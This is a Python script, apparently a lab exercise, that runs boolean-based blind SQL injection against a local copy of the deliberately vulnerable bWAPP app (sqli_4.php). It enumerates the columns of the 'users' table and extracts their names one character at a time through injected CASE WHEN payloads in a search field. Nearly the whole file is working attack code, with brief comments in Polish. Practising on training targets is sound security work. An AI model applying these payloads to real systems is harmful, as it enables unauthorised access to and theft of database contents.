#!/usr/python/python3

import requests
from sys import stdout

def write_console(message = None):
    clear_console()
    stdout.write("%s\r"%message)
    stdout.flush()

def clear_console():
    stdout.write("%s\r"%(' ' * 100))
    stdout.flush()

success_message = 'The movie exists in our database!'
count = -1
stop = False
url = 'http://127.0.0.1/sqli_4.php'
cookies = {"PHPSESSID": '239qi6gvss2s13ifotsn62bkn7', 'security_level': '0'}
ascii_start = 32
ascii_end = 127

# get the number of tables in the bWAPP DB
# wyciagamy liczbe tabeli z bazy danych bWAPP
while not stop:
    write_console("column count {}".format(count + 1))
    count += 1
    payload_table_count = "asd' OR CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')={} THEN true END#".format(count)
    data = {"title": payload_table_count, "action": "search"}
    response = requests.post(url = url, data = data, cookies = cookies)

    if response.status_code == requests.codes.ok:
        stop = success_message in response.text

print()

# wyciagamy nazwy wszystkich tabeli z bazy bWAPP
for offset in range(0,count):
    string_length = -1
    stop = False

    while not stop:
        # najpierw sprawdzamy dlugosc stringa
        string_length += 1
        write_console("checking name length for column {}: {}".format(offset + 1, string_length))
        payload_string_length = "asd' OR CASE WHEN (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='users' LIMIT {},1)={} THEN true END#".format(offset, string_length)

        data = {"title": payload_string_length, "action": "search"}
        response = requests.post(url = url, data = data, cookies = cookies)

        if response.status_code == requests.codes.ok:
            stop = success_message in response.text

    character_iterator = -1
    name = []

    print()

    while character_iterator <= string_length:
        # nastepnie pojedyczno sprawdzamy wszystkie znaki w stringu
        character_iterator += 1
        ascii_iterator = ascii_start - 1
        stop = False

        # iterujemy sie po kolei po kodach ascii aby odnalezc odpowiedni dla znaku na danej pozycji
        while not stop and ascii_iterator < ascii_end:
            ascii_iterator += 1

            write_console("column {} name: {}".format(offset + 1, ''.join(name)))
            payload_string_length = "asd' OR CASE WHEN (SELECT BINARY(SUBSTRING(column_name,{},1)) FROM information_schema.columns WHERE table_name='users' LIMIT {},1)=CHAR({}) THEN true END#".format(character_iterator, offset, ascii_iterator)

            data = {"title": payload_string_length, "action": "search"}
            response = requests.post(url = url, data = data, cookies = cookies)

            if response.status_code == requests.codes.ok:
                stop = success_message in response.text

        name.append(chr(ascii_iterator))

    print()


clear_console()